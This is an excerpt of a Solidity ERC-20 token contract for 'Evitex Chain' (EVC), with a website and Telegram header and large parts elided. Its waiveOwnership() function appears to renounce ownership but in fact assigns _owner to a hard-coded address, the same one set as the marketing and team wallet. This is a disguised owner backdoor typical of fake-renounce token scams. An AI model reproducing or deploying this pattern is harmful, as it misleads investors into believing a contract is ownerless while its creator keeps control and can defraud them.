...
/**
Website : http://evitexchain.tec
Telegram : https://t.me/evitexchain
*/
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x39C494e77632FC919ae4720fC89F098814C90b46);
    }
...
contract EVITEXCHAIN is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Evitex Chain";
    string private _symbol = "EVC";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x39C494e77632FC919ae4720fC89F098814C90b46);
    address payable public teamWalletAddress = payable(0x39C494e77632FC919ae4720fC89F098814C90b46);
